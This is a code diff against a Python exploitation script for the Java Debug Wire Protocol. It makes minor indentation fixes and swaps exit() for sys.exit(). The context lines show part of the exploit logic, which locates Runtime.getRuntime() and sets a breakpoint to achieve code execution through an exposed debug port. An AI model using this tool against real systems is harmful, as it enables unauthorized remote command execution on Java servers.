@@ -144,11 +144,11 @@ class JDWPClient:
                     elif t == 73:
                         data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                         buf = struct.unpack(">I", buf[index+5:index+9])
-			index=0
+                        index=0
 
                 else:
                     print "Error"
-                    exit(1)
+                    sys.exit(1)
 
             entries.append( data )
 
@@ -436,7 +436,7 @@ def runtime_exec(jdwp, args):
         print ("[-] Cannot find method Runtime.getRuntime()")
         return False
     print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
-
+    
     # 3. setup breakpoint on frequently called method
     c = jdwp.get_class_by_name( args.break_on_class )
     if c is None:
@@ -606,7 +606,7 @@ def str2fqclass(s):
     i = s.rfind('.')
     if i == -1:
         print("Cannot parse path")
-        exit(1)
+        sys.exit(1)
 
     method = s[i:][1:]
     classname = 'L' + s[:i].replace('.', '/') + ';'
@@ -614,7 +614,6 @@ def str2fqclass(s):
 
 
 if __name__ == "__main__":
-
     parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                      formatter_class=argparse.ArgumentDefaultsHelpFormatter )
 
@@ -652,4 +651,4 @@ if __name__ == "__main__":
     finally:
         cli.leave()
 
-    exit(retcode)
+    sys.exit(retcode)
